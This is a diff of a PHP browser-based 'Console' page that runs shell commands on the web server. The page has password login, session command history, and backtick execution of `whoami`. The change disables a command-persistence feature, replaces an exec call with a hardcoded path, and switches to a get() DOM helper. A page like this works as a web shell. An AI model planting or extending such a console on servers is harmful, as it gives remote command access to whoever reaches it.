@@ -8,37 +8,37 @@
 	if (isset($_POST['clear']) AND $_POST['clear'] == 'clear') {
 		clear_command();
 	}
-	
-	if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
-		$_SESSION['persist_commands'] = array();
+	// ! isset($_SESSION['persist_commands']) OR 
+	if ( ! isset($_SESSION['commands'])) {
+		// $_SESSION['persist_commands'] = array();
 		$_SESSION['commands'] = array();
 		$_SESSION['command_responses'] = array();
 	}
 	
-	$toggling_persist = FALSE;
-	$toggling_current_persist_command = FALSE;
+	// $toggling_persist = FALSE;
+	// $toggling_current_persist_command = FALSE;
 	
-	if (isset($_POST['persist_command_id']) AND is_numeric($_POST['persist_command_id'])) {
-		$toggling_persist = TRUE;
-		$persist_command_id = $_POST['persist_command_id'];
-		if (count($_SESSION['persist_commands']) == $persist_command_id) {
-			$toggling_current_persist_command = TRUE;
-		} else {
-			$_SESSION['persist_commands'][$persist_command_id] =
-				! $_SESSION['persist_commands'][$persist_command_id];
-		}
-	}
+	// if (isset($_POST['persist_command_id']) AND is_numeric($_POST['persist_command_id'])) {
+		// $toggling_persist = TRUE;
+		// $persist_command_id = $_POST['persist_command_id'];
+		// if (count($_SESSION['persist_commands']) == $persist_command_id) {
+			// $toggling_current_persist_command = TRUE;
+		// } else {
+			// $_SESSION['persist_commands'][$persist_command_id] =
+				// ! $_SESSION['persist_commands'][$persist_command_id];
+		// }
+	// }
 	
 	$previous_commands = '';
 	
-	foreach ($_SESSION['persist_commands'] as $index => $persist) {
-		if ($persist) {
-			$current_command = $_SESSION['commands'][$index];
-			if ($current_command != '') {
-				$previous_commands .= $current_command . '; ';
-			}
-		}
-	}
+	// foreach ($_SESSION['persist_commands'] as $index => $persist) {
+		// if ($persist) {
+			// $current_command = $_SESSION['commands'][$index];
+			// if ($current_command != '') {
+				// $previous_commands .= $current_command . '; ';
+			// }
+		// }
+	// }
 	
 	if (isset($_POST['command'])) {
 		$command = $_POST['command'];
@@ -49,11 +49,12 @@
 			} else {
 				$response = array('Incorrect Password');
 			}
-			array_push($_SESSION['persist_commands'], FALSE);
+			// array_push($_SESSION['persist_commands'], FALSE);
 			array_push($_SESSION['commands'], 'Password: ');
 			array_push($_SESSION['command_responses'], $response);
 		} else {
-			if ($command != '' AND ! $toggling_persist) {
+			//AND ! $toggling_persist
+			if ($command != '' ) {
 				if ($command == 'logout') {
 					session_unset();
 					$response = array('Successfully Logged Out');
@@ -69,20 +70,20 @@
 				$response = array();
 			}
 			if ($command != 'logout' AND $command != 'clear') {
-				if ($toggling_persist) {
-					if ($toggling_current_persist_command) {
-						array_push($_SESSION['persist_commands'], TRUE);
-						array_push($_SESSION['commands'], $command);
-						array_push($_SESSION['command_responses'], $response);
-						if ($command != '') {
-							$previous_commands = $previous_commands . $command . '; ';
-						}
-					}
-				} else {
-					array_push($_SESSION['persist_commands'], FALSE);
+				// if ($toggling_persist) {
+					// if ($toggling_current_persist_command) {
+						// array_push($_SESSION['persist_commands'], TRUE);
+						// array_push($_SESSION['commands'], $command);
+						// array_push($_SESSION['command_responses'], $response);
+						// if ($command != '') {
+							// $previous_commands = $previous_commands . $command . '; ';
+						// }
+					// }
+				// } else {
+					// array_push($_SESSION['persist_commands'], FALSE);
 					array_push($_SESSION['commands'], $command);
 					array_push($_SESSION['command_responses'], $response);
-				}
+				// }
 			}
 		}
 	}
@@ -210,9 +211,9 @@ $e = explode("/",$f);
 <h2>Console</h2>
 <div id="console">
 	<div class="content">
-		<div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
+		<div class="terminal" onclick="get('#command').focus();" id="terminal">
 			<div class="bar">
-				<?php echo `whoami`, ' - ', exec($previous_commands . 'pwd'); ?>
+				<?php echo `whoami`, ' - ', '/var/www/html/cod3r/py'; ?>
 			</div>
 			<form action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post" class="commands" id="commands">
 				<input type="hidden" name="persist_command_id" id="persist_command_id" />
@@ -253,14 +254,14 @@ $e = explode("/",$f);
 		
 		var current_command_index = previous_commands.length - 1;
 		
-		document.getElementById('command').select();
+		get('#command').select();
 		
-		document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+		get('#terminal').scrollTop = get('#terminal').scrollHeight;
 		
 		function toggle_persist_command(command_id)
 		{
-			document.getElementById('persist_command_id').value = command_id;
-			document.getElementById('commands').submit();
+			get('#persist_command_id').value = command_id;
+			get('#commands').submit();
 		}
 		
 		function command_keyed_down(event)
@@ -283,6 +284,7 @@ $e = explode("/",$f);
 					?>);
 					return false;
 				}
+				if(get('#command').value=='') {return false;}
 			}
 			return true;
 		}
@@ -294,7 +296,7 @@ $e = explode("/",$f);
 				current_command_index = 0;
 				return;
 			}
-			document.getElementById('command').value = previous_commands[current_command_index];
+			get('#command').value = previous_commands[current_command_index];
 		}
 		
 		function fill_in_next_command()
@@ -304,7 +306,7 @@ $e = explode("/",$f);
 				current_command_index = previous_commands.length - 1;
 				return;
 			}
-			document.getElementById('command').value = previous_commands[current_command_index];
+			get('#command').value = previous_commands[current_command_index];
 		}
 		
 		function get_key_code(event)
